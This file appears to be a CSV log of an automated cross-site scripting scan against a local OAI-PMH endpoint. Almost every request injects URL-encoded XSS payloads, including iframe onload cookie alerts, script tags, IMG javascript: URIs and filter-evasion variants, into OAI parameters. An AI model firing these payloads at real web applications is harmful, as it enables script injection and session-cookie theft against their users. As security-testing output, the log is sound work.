uuid,timestamp,http_status_code,request_url,response_time,http_version
81386a3c-5fa6-4c61-9155-bb3d15b78d03,2025-01-02 01:06:09,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIFRAME+width%3D%22420%22+height%3D%22315%22+frameborder%3D%220%22+onload%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E&metadataPrefix=oai_dc,2155.88 ms,HTTP/1.1
d4420f7e-10df-4ae6-820f-bff08e54030e,2025-01-02 01:06:11,403,http://localhost:8081/oai/request?verb=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E,2091.77 ms,HTTP/1.1
df31f55f-fec3-47ed-a067-7c2b68c74aab,2025-01-02 01:06:13,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2114.61 ms,HTTP/1.1
ce661422-f47a-4f4d-8896-96aeb28d1c39,2025-01-02 01:06:16,200,http://localhost:8081/oai/request?verb=ListSets,2118.40 ms,HTTP/1.1
faf8f741-46f8-4d22-9992-b0b66529f454,2025-01-02 01:06:18,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&set=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E,2143.81 ms,HTTP/1.1
e67819e5-79ba-481a-9162-4f1d16487b08,2025-01-02 01:06:21,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2124.58 ms,HTTP/1.1
5d130c53-bbc6-401d-aa25-cb82a9b5bd2e,2025-01-02 01:06:23,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&metadataPrefix=oai_dc,2114.91 ms,HTTP/1.1
42cca350-c829-49da-9a0b-3ee1e65acabc,2025-01-02 01:06:25,403,http://localhost:8081/oai/request?verb=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2093.19 ms,HTTP/1.1
482d0d14-23c6-404c-9da9-67e6b1ee3263,2025-01-02 01:06:28,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2120.51 ms,HTTP/1.1
ec2a3fb0-0184-41e0-9dc2-620919128525,2025-01-02 01:06:30,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2123.18 ms,HTTP/1.1
6c3d6619-e40d-483c-90d2-44efe0a467b9,2025-01-02 01:06:33,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&until=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&set=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2130.33 ms,HTTP/1.1
04ed5eff-914c-4136-bf94-2e9ebf3022e4,2025-01-02 01:06:35,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2192.65 ms,HTTP/1.1
ac0207e9-832e-4966-92cc-81fd4ee438aa,2025-01-02 01:06:38,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&metadataPrefix=marc,2126.57 ms,HTTP/1.1
b830ec93-8e2d-435c-b68c-1c0ae33bc9c0,2025-01-02 01:06:40,403,http://localhost:8081/oai/request?verb=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2092.83 ms,HTTP/1.1
a3514a35-922a-496d-ac7f-6a641eae1e4f,2025-01-02 01:06:42,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2129.85 ms,HTTP/1.1
e2851024-7af5-4d3b-b55e-d39bf9af3a78,2025-01-02 01:06:45,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2132.60 ms,HTTP/1.1
83149091-5c50-4145-868e-c37f86fa7a0b,2025-01-02 01:06:47,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2108.07 ms,HTTP/1.1
f8449b9a-5e24-4a48-82bb-1384070abc6e,2025-01-02 01:06:50,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2120.05 ms,HTTP/1.1
a8a8decb-51c8-4a85-acfb-3d75d1472aa5,2025-01-02 01:06:52,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E&metadataPrefix=marc,2146.72 ms,HTTP/1.1
56c494f3-8203-4b81-91c5-4720ebb31fe1,2025-01-02 01:06:54,403,http://localhost:8081/oai/request?verb=%3CIMG+DYNSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2086.29 ms,HTTP/1.1
2f42bf30-550e-44f3-80ed-2e9e7a091d0a,2025-01-02 01:06:57,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIMG+DYNSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2122.77 ms,HTTP/1.1
e410a894-785a-4f08-ab97-0c6924a2b284,2025-01-02 01:06:59,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+DYNSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2137.70 ms,HTTP/1.1
65e9c47c-6744-406e-9e6b-7be8c3ab7583,2025-01-02 01:07:02,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3CIMG+DYNSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E&set=%3CIMG+DYNSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2143.86 ms,HTTP/1.1
01bb7098-4ccf-4bcc-9c3f-ee3eacbd8ed5,2025-01-02 01:07:04,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2133.95 ms,HTTP/1.1
b13cc867-72d1-4035-b7b4-400ca01981c4,2025-01-02 01:07:06,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+DYNSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E&metadataPrefix=marc,2134.00 ms,HTTP/1.1
3910248e-a04a-4a67-a448-5f82b280f1cf,2025-01-02 01:07:09,403,http://localhost:8081/oai/request?verb=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2081.68 ms,HTTP/1.1
c100f8e9-13e4-4b81-a8bd-8d060f598caa,2025-01-02 01:07:11,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2139.21 ms,HTTP/1.1
4209f7c5-36d8-4904-bec2-dfc8748cced6,2025-01-02 01:07:14,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2114.20 ms,HTTP/1.1
c165f457-7180-4649-a932-4ccd610f2239,2025-01-02 01:07:16,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&set=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2148.17 ms,HTTP/1.1
2d8edf24-33bc-487b-8cdc-cc9018f87c71,2025-01-02 01:07:18,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&set=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,2140.56 ms,HTTP/1.1
f9701b91-5369-4520-8efb-11c632571a47,2025-01-02 01:07:21,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&metadataPrefix=oai_dc,2105.69 ms,HTTP/1.1
0c97fad9-655b-4552-ae9f-d51464d12870,2025-01-02 01:07:23,403,http://localhost:8081/oai/request?verb=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2087.37 ms,HTTP/1.1
40886669-b926-4f6a-a651-b02f9666576f,2025-01-02 01:07:26,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2122.60 ms,HTTP/1.1
0b417efe-2623-4f3a-96fc-7dca9d7836da,2025-01-02 01:07:28,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2090.92 ms,HTTP/1.1
43b292a1-5972-4d9c-a80e-0a4ac702a99c,2025-01-02 01:07:30,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2125.45 ms,HTTP/1.1
bd9db40b-9beb-4dc4-acd0-7df1ac1f9019,2025-01-02 01:07:33,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E&until=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,2130.14 ms,HTTP/1.1
371e053f-7627-4da7-a28b-b60969788986,2025-01-02 01:07:35,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E&metadataPrefix=marc,2128.45 ms,HTTP/1.1
bbf56b6d-0f98-4f3d-b992-dddb1f03eb09,2025-01-02 01:07:37,403,http://localhost:8081/oai/request?verb=%3CIMG+LOWSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2069.15 ms,HTTP/1.1
9e995669-90c3-4693-b8e9-2e7437a2dca0,2025-01-02 01:07:40,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2132.40 ms,HTTP/1.1
163c0030-3c82-444f-8d50-78ea45a04640,2025-01-02 01:07:42,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+LOWSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2157.11 ms,HTTP/1.1
08adba76-feaa-470d-abe4-6ad8478991c1,2025-01-02 01:07:45,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3CIMG+LOWSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2133.18 ms,HTTP/1.1
531f3cb2-4922-4547-9a15-34676e2d9879,2025-01-02 01:07:47,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIMG+LOWSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E,2109.13 ms,HTTP/1.1
d502766b-893d-4e2e-b765-643631c508de,2025-01-02 01:07:49,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+LOWSRC%3D%5C%22javascript%3Aalert%28%27XSS%27%29%5C%22%3E&metadataPrefix=oai_dc,2109.78 ms,HTTP/1.1
c479774d-2336-4acb-823e-7d81392f0ff5,2025-01-02 01:07:52,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E,2085.03 ms,HTTP/1.1
34ed0346-9367-4341-adaf-4f5f0b9e859f,2025-01-02 01:07:54,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2146.18 ms,HTTP/1.1
c8f089f6-a48e-45a7-ab5f-b642a606d413,2025-01-02 01:07:57,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E,2130.57 ms,HTTP/1.1
14ebe58c-efac-4b3f-81d7-375f57d7a69e,2025-01-02 01:07:59,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E&until=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E,2148.75 ms,HTTP/1.1
b9cc8eb1-c164-44f5-9d69-b9da0e75e57c,2025-01-02 01:08:02,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E&until=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E,2134.14 ms,HTTP/1.1
79dae233-b5fb-45f9-8510-1ae6e8cbcf81,2025-01-02 01:08:04,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E&metadataPrefix=oai_dc,2141.18 ms,HTTP/1.1
ea78a4ea-a402-4f4d-8313-7e086c2f6272,2025-01-02 01:08:06,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E,2084.53 ms,HTTP/1.1
5b46a590-20d7-4cd6-b969-3c5249708e12,2025-01-02 01:08:09,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2120.36 ms,HTTP/1.1
c941e469-121b-4bb7-92b7-ce469e0819f6,2025-01-02 01:08:11,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E,2128.69 ms,HTTP/1.1
4442cbd4-2fc7-46bf-a622-fefe95c7ae19,2025-01-02 01:08:14,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E&until=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E,2175.39 ms,HTTP/1.1
c2621d51-dc20-4731-b599-84a8a29b3516,2025-01-02 01:08:16,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E&until=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E&set=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E,2131.48 ms,HTTP/1.1
cf04a51c-79de-4b77-a719-be6b983108eb,2025-01-02 01:08:18,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E&metadataPrefix=oai_dc,2115.03 ms,HTTP/1.1
076da8bd-8aa3-4097-bbc3-6b949995ef14,2025-01-02 01:08:21,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E,2089.65 ms,HTTP/1.1
71143155-96a5-4570-a93d-9d966356f8f2,2025-01-02 01:08:23,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E,2132.43 ms,HTTP/1.1
121dfec0-76f0-4b2a-8503-5ac01f9f0aef,2025-01-02 01:08:26,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E,2116.31 ms,HTTP/1.1
bf330b5a-0d9c-496e-88b4-2efd5dfa4c92,2025-01-02 01:08:28,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&until=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E,2126.03 ms,HTTP/1.1
a0662bdb-307d-43ff-9134-3852f64b0f69,2025-01-02 01:08:30,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&set=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E,2091.77 ms,HTTP/1.1
189f9b64-4182-4887-94db-c54c490cc10d,2025-01-02 01:08:33,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E&metadataPrefix=marc,2145.18 ms,HTTP/1.1
6348b730-7ea8-410a-bec2-369c9c39262c,2025-01-02 01:08:35,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2096.61 ms,HTTP/1.1
133c3736-9a34-4469-bada-b531b9816bb7,2025-01-02 01:08:38,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIMG+SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2132.77 ms,HTTP/1.1
79f86905-090b-4601-8efa-104204bb4044,2025-01-02 01:08:40,200,http://localhost:8081/oai/request?verb=ListSets,2118.83 ms,HTTP/1.1
46bfbc3d-7ff9-4b3d-a14a-36bb99d5907c,2025-01-02 01:08:42,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3CIMG+SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2110.79 ms,HTTP/1.1
c1e74f23-95dd-4fac-9eaa-b29618a821d2,2025-01-02 01:08:45,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CIMG+SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2165.39 ms,HTTP/1.1
0587d8c1-9c33-4bed-ab50-9cc305181de7,2025-01-02 01:08:47,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E&metadataPrefix=oai_dc,2121.59 ms,HTTP/1.1
b2281415-9e54-4099-ae54-8ec71d4de8ca,2025-01-02 01:08:49,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav++++ascript%3Ajavascript%3Aalert%281%29%3B%22%3E,2081.51 ms,HTTP/1.1
e217bea8-24de-44a6-9190-ed49373667ea,2025-01-02 01:08:52,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3CIMG+SRC%3D%22jav++++ascript%3Ajavascript%3Aalert%281%29%3B%22%3E,2131.61 ms,HTTP/1.1
57ea1abd-7f56-4ae5-b593-c9c39170ddc5,2025-01-02 01:08:54,200,http://localhost:8081/oai/request?verb=ListSets,2102.86 ms,HTTP/1.1
11f8e8d4-e720-4023-bd58-d413f9b120db,2025-01-02 01:08:57,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2148.36 ms,HTTP/1.1
b16dad3e-3919-41d8-b63c-4c8bca455eb6,2025-01-02 01:08:59,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3CIMG+SRC%3D%22jav++++ascript%3Ajavascript%3Aalert%281%29%3B%22%3E&until=%3CIMG+SRC%3D%22jav++++ascript%3Ajavascript%3Aalert%281%29%3B%22%3E,2133.50 ms,HTTP/1.1
9fd13985-2489-480e-a26f-1443e380a13a,2025-01-02 01:09:02,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22jav++++ascript%3Ajavascript%3Aalert%281%29%3B%22%3E&metadataPrefix=marc,2155.44 ms,HTTP/1.1
f98c0def-4b7d-4c6f-a9ce-eb16ad70f967,2025-01-02 01:09:04,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2083.48 ms,HTTP/1.1
7757c4eb-f0c0-443f-a8fa-260eb16f5418,2025-01-02 01:09:06,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2118.12 ms,HTTP/1.1
9519b41a-44e2-4d89-9c06-d48f439a1756,2025-01-02 01:09:09,200,http://localhost:8081/oai/request?verb=ListSets,2098.00 ms,HTTP/1.1
bb7d6038-4a32-4dbb-80c2-ffd0f8739d96,2025-01-02 01:09:11,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2120.18 ms,HTTP/1.1
b539280c-1994-4c6b-9cc2-d204b9f5ff14,2025-01-02 01:09:14,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&until=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E,2145.15 ms,HTTP/1.1
09605895-8d78-431e-9352-7f3d15ed800a,2025-01-02 01:09:16,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E&metadataPrefix=oai_dc,2110.71 ms,HTTP/1.1
4eeb9e14-0bed-4032-acce-860485b52599,2025-01-02 01:09:18,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav+ascript%3Ajavascript%3Aalert%281%29%3B%22%3E,2086.46 ms,HTTP/1.1
64b8a211-f78b-4bea-9e02-416f547419b7,2025-01-02 01:09:21,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2094.60 ms,HTTP/1.1
8229fae9-da9e-424f-9f59-c276234dbb74,2025-01-02 01:09:23,200,http://localhost:8081/oai/request?verb=ListSets,2092.86 ms,HTTP/1.1
9e035a91-366f-44e0-986a-ceb5e8e271ca,2025-01-02 01:09:25,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3CIMG+SRC%3D%22jav+ascript%3Ajavascript%3Aalert%281%29%3B%22%3E&set=%3CIMG+SRC%3D%22jav+ascript%3Ajavascript%3Aalert%281%29%3B%22%3E,2145.36 ms,HTTP/1.1
9e05c50d-9e6b-40a1-89ea-95913e9682b9,2025-01-02 01:09:28,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2125.03 ms,HTTP/1.1
d621912f-76df-41ab-87ea-467638bbd020,2025-01-02 01:09:30,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22jav+ascript%3Ajavascript%3Aalert%281%29%3B%22%3E&metadataPrefix=oai_dc,2130.79 ms,HTTP/1.1
7e1b77f1-e0df-4fff-baf0-1f6bc1828ca1,2025-01-02 01:09:33,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,2072.42 ms,HTTP/1.1
1e7d5ad2-f284-4ca9-8762-14e458104e8a,2025-01-02 01:09:35,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2118.32 ms,HTTP/1.1
18a3415c-738f-4452-b008-bea57f635373,2025-01-02 01:09:37,200,http://localhost:8081/oai/request?verb=ListSets,2145.45 ms,HTTP/1.1
50c966f6-e6ca-41cd-8cf3-3320318b946c,2025-01-02 01:09:40,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,2144.89 ms,HTTP/1.1
ae02b289-97f9-4897-9064-6c236df3bdea,2025-01-02 01:09:42,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&set=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,2156.90 ms,HTTP/1.1
5e3a3bf6-39e0-4431-a505-0b141e47466d,2025-01-02 01:09:45,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&metadataPrefix=oai_dc,2109.05 ms,HTTP/1.1
711984b6-869c-4883-adc2-75ad4ad698d1,2025-01-02 01:09:47,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,2080.70 ms,HTTP/1.1
4914fd0e-4ea7-4a7b-a6c5-36e0a4dc1eaa,2025-01-02 01:09:49,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2125.73 ms,HTTP/1.1
4e10ac2c-d473-400b-9c8f-1df0dcff11af,2025-01-02 01:09:52,200,http://localhost:8081/oai/request?verb=ListSets,2110.36 ms,HTTP/1.1
36833b3d-d81b-4226-9cbe-35ccdeffdf81,2025-01-02 01:09:54,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,2105.07 ms,HTTP/1.1
1313b47a-2976-4049-8e50-896dfd72e809,2025-01-02 01:09:57,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&until=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&set=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,2118.41 ms,HTTP/1.1
81eb4de7-2019-456a-b0ca-3d73c45a7796,2025-01-02 01:09:59,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&metadataPrefix=marc,2094.95 ms,HTTP/1.1
42b9c3bf-ce10-4239-a9bc-2ee0edc93c9a,2025-01-02 01:10:01,403,http://localhost:8081/oai/request?verb=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%3CWBR%3E%27XSS%27%29%3B%22%3E,2074.34 ms,HTTP/1.1
